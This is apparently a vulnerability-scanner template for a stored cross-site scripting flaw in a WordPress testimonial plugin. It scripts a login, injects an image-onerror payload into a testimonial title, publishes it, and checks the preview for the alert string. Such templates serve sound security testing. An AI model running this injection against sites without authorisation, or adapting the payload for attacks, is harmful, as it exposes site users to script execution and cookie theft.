id: wordpress-plugin-testimonial-slider-and-showcase-xss

info:
  name: WordPress Plugin Testimonial Slider and Showcase 2.2.6 - XSS
  author: LRTK-CODER
  severity: medium
  description: |
    WordPress Plugin "Testimonial Slider and Showcase" is prone to a crodd-dite scripting (XSS) vulnerability because it fails to properly sanitize user-supplied input. An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks. WordPress Plugin "Testimonial Slider and Showcase" version 2.2.6 is vulnerable; prior versions may also be affected.
  reference:
    - https://www.exploit-db.com/exploits/51007
  tags: wordpress, wp, plugin, xss

headless:
  - steps:
      # ---- Login Process ----
      - action: navigate
        args:
          url: "{{BaseURL}}/wp-login.php"

      - action: waitload

      - action: click
        args:
          by: xpath
          xpath: /html/body/div[1]/form/p[1]/input

      - action: waitload

      - action: text
        args:
          by: xpath
          xpath: /html/body/div[1]/form/p[1]/input
          value: "{{username}}"

      - action: click
        args:
          by: xpath
          xpath: /html/body/div[1]/form/div/div/input

      - action: waitload

      - action: text
        args:
          by: xpath
          xpath: /html/body/div[1]/form/div/div/input
          value: "{{password}}"

      - action: click
        args:
          by: xpath
          xpath: /html/body/div[1]/form/p[3]/input[1]

      - action: waitload
      # ---- Login Process End ----

      # ---- Writing Testimonial Slider and Showcase Plugin ----
      - action: click
        args:
          by: xpath
          xpath: //div[text()='Testimonial']

      - action: waitload

      - action: click
        args:
          by: xpath
          xpath: //a[text()='Add Testimonial']

      - action: waitload

      - action: click
        args:
          by: xpath
          xpath: //*[@id="title"]

      - action: waitload

      - action: text
        args:
          by: xpath
          xpath: //*[@id="title"]
          value: test"><img/src=""/onerror="alert(1234)"/>

      - action: click
        args:
          by: xpath
          xpath: //*[@id="publish"]

      - action: waitload
      # ---- Writing Testimonial Slider and Showcase Plugin End ----

      # ---- Move uploaded page ----
      - action: click
        args:
          by: xpath
          xpath: //*[@id="post-preview"]

    matchers:
      - type: word
        words:
          - "alert(1234)"
